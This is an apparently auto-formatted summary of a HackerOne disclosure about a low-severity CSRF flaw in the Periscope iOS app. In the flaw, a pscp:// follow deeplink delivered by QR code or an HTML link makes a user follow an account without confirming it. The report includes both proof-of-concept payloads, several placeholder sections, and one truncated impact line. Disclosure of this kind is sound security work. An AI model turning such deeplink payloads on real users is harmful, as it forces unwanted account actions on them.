# Periscope iOS app CSRF in follow action due to deeplink

## Metadata
- **Source:** HackerOne
- **Report:** 805073 | https://hackerone.com/reports/805073
- **Submitted:** 2020-02-26
- **Reporter:** mgf15
- **Program:** Unknown
- **Bounty:** $2,940
- **Severity:** low
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Summary

This issue is mainly in the Periscope iOS app against CSRF follow action using deeplink.

as the report  #583987 the CSRF work on iOS app 

POC 1

QR code to follow periscope profile 

`pscp://user/periscopeco/follow
`

███████

POC2 by kunal94

```
<!DOCTYPE html>
<html>
<a href="pscp://user/<any user-id>/follow">CSRF DEMO</a>
</html>
```
video
█████████

## Impact

CSRF Follow against a

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Summary

This issue is mainly in the Periscope iOS app against CSRF follow action using deeplink.

as the report  #583987 the CSRF work on iOS app 

POC 1

QR code to follow periscope profile 

`pscp://user/periscopeco/follow
`

███████

POC2 by kunal94

```
<!DOCTYPE html>
<html>
<a href="pscp://user/<any user-id>/follow">CSRF DEMO</a>
</html>
```
video
█████████

## Impact

CSRF Follow against any user in periscope iOS app

</details>

---
*Analysed by Claude on 2026-05-24*
